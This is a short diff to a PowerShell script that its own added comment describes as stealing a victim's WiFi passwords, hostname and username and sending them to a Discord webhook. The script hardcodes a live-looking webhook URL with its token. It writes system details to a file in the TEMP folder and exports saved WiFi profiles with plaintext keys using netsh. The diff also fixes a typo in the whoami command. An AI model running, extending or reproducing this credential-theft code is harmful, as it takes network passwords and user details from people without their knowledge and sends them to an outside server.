@@ -1,10 +1,12 @@
-﻿$Uri='https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1'
+# This code gets the WiFi passwords from a victim (with some basic info such as Hostname and Username), and sends them to a Discord Webhook
+
+$Uri='https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1'
 $Body = ''
 Set-Location -Path $env:TEMP
 $hostname = hostname
 $hostname = "Hostname: " + $hostname
 $hostname > Wi-Fi-PASS
-$whoami = whoai
+$whoami = whoami
 $whoami = "User: " + $whoami
 $whoami >> Wi-Fi-PASS
 netsh wlan export profile key=clear
